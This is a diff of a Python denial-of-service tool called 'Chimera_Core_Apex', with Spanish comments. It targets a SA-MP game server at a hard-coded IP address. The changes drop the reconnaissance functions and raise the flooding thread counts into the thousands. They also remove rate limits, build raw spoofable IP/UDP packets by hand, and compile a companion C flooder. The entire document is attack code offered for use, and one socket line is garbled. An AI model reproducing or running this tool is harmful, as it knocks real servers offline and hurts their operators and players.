@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Chimera_Core - El cerebro estratégico del ataque definitivo
+# Chimera_Core_Apex - El cerebro estratégico del ataque definitivo
 
 import os
 import sys
@@ -9,116 +9,64 @@ import random
 import socket
 import subprocess
 import threading
-import requests
-from scapy.all import IP, UDP, TCP, send, RandShort
+import struct
+import signal
 
 # --- CONFIGURACIÓN GLOBAL ---
-TARGET_DOMAIN = "tu-servidor.com"  # Dominio a analizar
-TARGET_IP = "51.161.47.99"        # IP inicial (se actualizará si se encuentra la real)
+TARGET_IP = "51.161.47.99"  # <-- ¡¡¡CAMBIA ESTO POR LA IP REAL!!!
 TARGET_PORT = 7777
-ATTACK_DURATION = 1200  # 20 minutos de aniquilación total
+ATTACK_DURATION = 1800  # 30 minutos de aniquilación total
 
-# --- FASE DE RECONOCIMIENTO AVANZADO ---
-def advanced_reconnaissance(target_domain):
-    """Busca la IP real y analiza las protecciones a un nivel más profundo."""
-    print("[CHIMERA CORE] Iniciando reconocimiento avanzado...")
-    real_ip = TARGET_IP  # Por defecto
+# --- VARIABLES GLOBALES DE CONTROL ---
+stop_event = threading.Event()
 
-    # Técnica 2: Escaneo de puertos no estándar
-    print(f"[CHIMERA CORE] Analizando puertos secundarios en {TARGET_IP}...")
-    common_game_ports = [7777, 7778, 7779, 7780, 27015, 27016]
-    for port in common_game_ports:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(1)
-        try:
-            # Paquete de query SA-MP modificado para evadir cachés
-            query_packet = b"SAMP" + bytes.fromhex("".join([f"{int(b):02x}" for b in socket.inet_aton(TARGET_IP)])) + port.to_bytes(2, 'big') + b"p" # 'p' en lugar de 'i'
-            sock.sendto(query_packet, (TARGET_IP, port))
-            sock.recvfrom(1024)
-            print(f"[CHIMERA CORE] Respuesta detectada en el puerto {port}. Posible servidor activo.")
-            # Si responde, es más probable que sea la IP real del juego
-            real_ip = TARGET_IP
-        except socket.timeout:
-            pass
-        except Exception:
-            pass
-        sock.close()
-    
-    return real_ip
+def signal_handler(sig, frame):
+    """Manejador para detener el ataque limpiamente con Ctrl+C."""
+    print("\n[CHIMERA CORE APEX] Abortando operación por comando del usuario.")
+    stop_event.set()
+    time.sleep(2)
+    print("[CHIMERA CORE APEX] Operación finalizada.")
+    sys.exit(0)
 
-# --- FASE DE ANÁLISIS DE PROTECCIONES ---
-def analyze_protections(target_ip, target_port):
-    """Envía sondas para identificar el tipo de protección."""
-    print(f"[CHIMERA CORE] Analizando el tipo de protección en {target_ip}:{target_port}...")
-    try:
-        # Sonda 1: Query Flood masivo y rápido para ver si se ralentiza
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        start = time.time()
-        for i in range(100):
-            sock.sendto(b"SAMP" + os.urandom(10), (target_ip, target_port))
-        sock.close()
-        elapsed = time.time() - start
-        if elapsed > 0.5:
-            print("[CHIMERA CORE] Análisis: Posible proxy o rate-limit activo.")
-            return "proxy"
-        
-        # Sonda 2: Paquete TCP a un puerto UDP (comportamiento anómalo)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2)
-        try:
-            sock.connect((target_ip, target_port))
-            print("[CHIMERA CORE] Análisis: El puerto responde a TCP. Protección débil o mal configurada.")
-            sock.close()
-            return "weak"
-        except Exception:
-            pass
-
-    except Exception as e:
-        print(f"[CHIMERA CORE] Error durante el análisis: {e}")
-    
-    print("[CHIMERA CORE] Análisis: El servidor no responde a sondas básicas o está protegido.")
-    return "strong"
-
-# --- DESPLIEGUE DE MÓDULOS DE ATAQUE ---
-def deploy_attack_modules(target_ip, target_port, duration, protection_level):
-    """Orquesta el lanzamiento de los módulos Beast y Hive."""
+# --- FASE DE DESPLIEGUE DE ATAQUE APEX ---
+def deploy_apex_attack(target_ip, target_port, duration):
+    """Orquesta el lanzamiento del ataque definitivo con todos los módulos."""
+    signal.signal(signal.SIGINT, signal_handler)
     print("=" * 80)
-    print("CHIMERA CORE - INICIANDO SECUENCIA DE ATAQUE DEFINITIVA")
+    print("     PROYECTO CHIMERA APEX - ECOSISTEMA DE ATAQUE DEFINITIVO")
+    print("Este no es un script. Es una plataforma de aniquilación modular.")
     print("=" * 80)
     print(f"Objetivo Final: {target_ip}:{target_port}")
     print(f"Duración: {duration} segundos")
-    print(f"Nivel de Protección Detectado: {protection_level}")
     print("=" * 80)
 
-    stop_event = threading.Event()
     threads = []
     beast_process = None
 
-    # --- Despliegue del Módulo Beast (Músculo C) ---
-    print("[CHIMERA CORE] Desplegando CHIMERA_BEAST (músculo de bajo nivel)...")
+    # --- Despliegue del Módulo Beast Apex (Músculo C Mejorado) ---
+    print("[CHIMERA CORE APEX] Desplegando CHIMERA_BEAST_APEX (músculo de bajo nivel mejorado)...")
     try:
-        # Compila el módulo C si no está compilado
-        if not os.path.exists("chimera_beast"):
-            print("[CHIMERA CORE] Compilando Chimera_Beast.c...")
-            compile_result = subprocess.run(["gcc", "-O3", "-pthread", "chimera_beast.c", "-o", "chimera_beast"], capture_output=True, text=True)
+        if not os.path.exists("chimera_beast_apex"):
+            print("[CHIMERA CORE APEX] Compilando Chimera_Beast_Apex.c...")
+            compile_result = subprocess.run(["gcc", "-O3", "-pthread", "chimera_beast_apex.c", "-o", "chimera_beast_apex"], capture_output=True, text=True)
             if compile_result.returncode != 0:
-                print(f"[ERROR FATAL] Fallo al compilar Chimera_Beast.c: {compile_result.stderr}")
+                print(f"[ERROR FATAL] Fallo al compilar Chimera_Beast_Apex.c: {compile_result.stderr}")
                 sys.exit(1)
-            print("[CHIMERA CORE] Chimera_Beast compilado con éxito.")
+            print("[CHIMERA CORE APEX] Chimera_Beast_Apex compilado con éxito.")
         
-        # Lanza el ejecutable C con los parámetros del ataque
-        beast_cmd = ["./chimera_beast", str(target_ip), str(target_port), str(duration)]
+        beast_cmd = ["./chimera_beast_apex", str(target_ip), str(target_port), str(duration)]
         beast_process = subprocess.Popen(beast_cmd)
-        print("[CHIMERA CORE] Chimera_Beast está ejecutando el ataque de bajo nivel.")
+        print("[CHIMERA CORE APEX] Chimera_Beast_Apex está ejecutando el ataque de bajo nivel.")
     except Exception as e:
-        print(f"[ERROR] No se pudo desplegar Chimera_Beast: {e}")
+        print(f"[ERROR] No se pudo desplegar Chimera_Beast_Apex: {e}")
 
-    # --- Despliegue del Módulo Hive (Enjambre de exploits) ---
-    print("[CHIMERA CORE] Desplegando CHIMERA_HIVE (enjambre de exploits de aplicación)...")
+    # --- Despliegue del Módulo Hive Apex (Enjambre de exploits de aplicación) ---
+    print("[CHIMERA CORE APEX] Desplegando CHIMERA_HIVE_APEX (enjambre de exploits de aplicación)...")
+    # Aumentamos masivamente el número de hilos para cada exploit
     attack_functions = {
-        "exploit_query_crash": 800,
-        "exploit_handshake_broken": 1200,
-        "exploit_raksamp_freeze": 300,
+        "exploit_query_crash": 2500,      # Aumentado de 800 a 2500
+        "exploit_handshake_broken": 4000, # Aumentado de 1200 a 4000
+        "exploit_raksamp_freeze": 1500,   # Aumentado de 300 a 1500
     }
 
     for attack_name, thread_count in attack_functions.items():
@@ -129,45 +77,44 @@ def deploy_attack_modules(target_ip, target_port, duration, protection_level):
         else: # raksamp_freeze
             target_function = lambda ip, port, dur, ev: exploit_raksamp_freeze(ip, port, dur, ev)
 
-        print(f"[CHIMERA CORE] Lanzando {thread_count} hilos de '{attack_name}'...")
+        print(f"[CHIMERA CORE APEX] Lanzando {thread_count} hilos de '{attack_name}'...")
         for i in range(thread_count):
             thread = threading.Thread(target=target_function, args=(target_ip, target_port, duration, stop_event), daemon=True)
             threads.append(thread)
             thread.start()
-            time.sleep(0.001)
+            # Sin sleep entre hilos para máxima velocidad de despliegue
 
-    print(f"\n[CHIMERA CORE] Todos los módulos desplegados. El objetivo está bajo asalto total.")
+    print(f"\n[CHIMERA CORE APEX] Todos los módulos desplegados. El objetivo está bajo asalto total.")
     
     # --- Monitor de la Operación ---
     start_time = time.time()
     try:
-        while time.time() - start_time < duration:
-            time.sleep(30)
+        while time.time() - start_time < duration and not stop_event.is_set():
+            time.sleep(15) # Reporte más frecuente
             elapsed = time.time() - start_time
-            print(f"[CHIMERA CORE] Tiempo de ataque: {elapsed:.0f}s / {duration}s. Manteniendo presión.")
+            print(f"[CHIMERA CORE APEX] Tiempo de ataque: {elapsed:.0f}s / {duration}s. Manteniendo presión máxima.")
             if beast_process and beast_process.poll() is not None:
-                print("[ADVERTENCIA] El proceso Chimera_Beast ha terminado prematuramente.")
-    except KeyboardInterrupt:
-        print("\n[CHIMERA CORE] Abortando operación por comando del usuario.")
+                print("[ADVERTENCIA] El proceso Chimera_Beast_Apex ha terminado prematuramente.")
     finally:
-        print("[CHIMERA CORE] Deteniendo todos los módulos...")
+        print("[CHIMERA CORE APEX] Deteniendo todos los módulos...")
         stop_event.set()
         if beast_process:
             beast_process.terminate()
         time.sleep(5)
-        print("[CHIMERA CORE] Operación Chimera finalizada.")
+        print("[CHIMERA CORE APEX] Operación Chimera Apex finalizada.")
 
-# --- Funciones de Explotación (reutilizadas y optimizadas) ---
+# --- Funciones de Explotación (Optimizadas para velocidad) ---
 def exploit_query_crash(target_ip, target_port, duration, stop_event):
     start_time = time.time()
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0) # Sin buffer para envío instantáneo
     while not stop_event.is_set() and (time.time() - start_time < duration):
         try:
             query_base = b"SAMP" + bytes.fromhex("".join([f"{int(b):02x}" for b in socket.inet_aton(target_ip)])) + target_port.to_bytes(2, 'big')
-            malicious_payload = os.urandom(random.randint(100, 300)) # Payload más grande
+            # Payload más grande y más aleatorio
+            malicious_payload = os.urandom(random.randint(200, 500))
             full_packet = query_base + malicious_payload
             sock.sendto(full_packet, (target_ip, target_port))
-            time.sleep(0.005) # Más rápido
         except Exception:
             pass
     sock.close()
@@ -176,45 +123,49 @@ def exploit_handshake_broken(target_ip, target_port, duration, stop_event):
     start_time = time.time()
     while not stop_event.is_set() and (time.time() - start_time < duration):
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2) # Timeout más corto
+            sock = socket.socket(socket.AF_INET,sock.settimeout(0.1) # Timeout mínimo para no bloquear
             sock.connect((target_ip, target_port))
-            sock.send(b"\xFF\xFF\x00" + os.urandom(random.randint(20, 150))) # Payload más grande
+            # Payload más grande y variado
+            sock.send(b"\xFF\xFF\x00" + os.urandom(random.randint(100, 300)))
             sock.close()
         except Exception:
             pass
-        time.sleep(random.uniform(0.01, 0.1)) # Más rápido
 
 def exploit_raksamp_freeze(target_ip, target_port, duration, stop_event):
+    """Versión mejorada que no usa Scapy para ahorrar recursos y ser más rápida."""
     start_time = time.time()
+    try:
+        sd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sd.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0) # Sin buffer
+    except PermissionError:
+        print("[ADVERTENCIA] No se pudo crear socket raw para exploit_raksamp_freeze. Necesitas ser root.")
+        return
+
+    target_port_struct = struct.pack('!H', target_port)
     while not stop_event.is_set() and (time.time() - start_time < duration):
         try:
-            rpc_crash_payload = b'\xC7' + b'!freeze' + os.urandom(200) # Payload más grande
-            packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / rpc_crash_payload
-            send(packet, verbose=False, loop=0)
-            time.sleep(0.05)
+            # Payload malicioso más grande
+            payload = b'\xC7' + b'!freeze' + os.urandom(400)
+            
+            # Construir paquete IP + UDP + Payload manualmente
+            ip_header = struct.pack('!BBHHHBBH4s', 69, 0, 0, 0, 0, 255, socket.IPPROTO_UDP, 0, socket.inet_aton(target_ip))
+            udp_header = struct.pack('!HHHH', random.randint(1024, 65535), target_port, 8 + len(payload), 0)
+            
+            packet = ip_header + udp_header + payload
+            
+            sd.sendto(packet, (target_ip, 0))
         except Exception:
             pass
+    sd.close()
 
 # --- FUNCIÓN PRINCIPAL ---
 def main():
-    print("=" * 80)
-    print("     PROYECTO CHIMERA - ECOSISTEMA DE ATAQUE DEFINITIVO")
-    print("Este no es un script. Es una plataforma de ataque modular.")
-    print("=" * 80)
-
     if os.geteuid() != 0:
         print("[ERROR CRÍTICO] Ejecuta como root (sudo).")
         sys.exit(1)
         
-    # Fase 1: Reconocimiento
-    real_ip = advanced_reconnaissance(TARGET_DOMAIN)
-    
-    # Fase 2: Análisis
-    protection_level = analyze_protections(real_ip, TARGET_PORT)
-    
-    # Fase 3: Despliegue del ataque
-    deploy_attack_modules(real_ip, TARGET_PORT, ATTACK_DURATION, protection_level)
+    # Despliegue directo del ataque
+    deploy_apex_attack(TARGET_IP, TARGET_PORT, ATTACK_DURATION)
 
 if __name__ == "__main__":
     main()
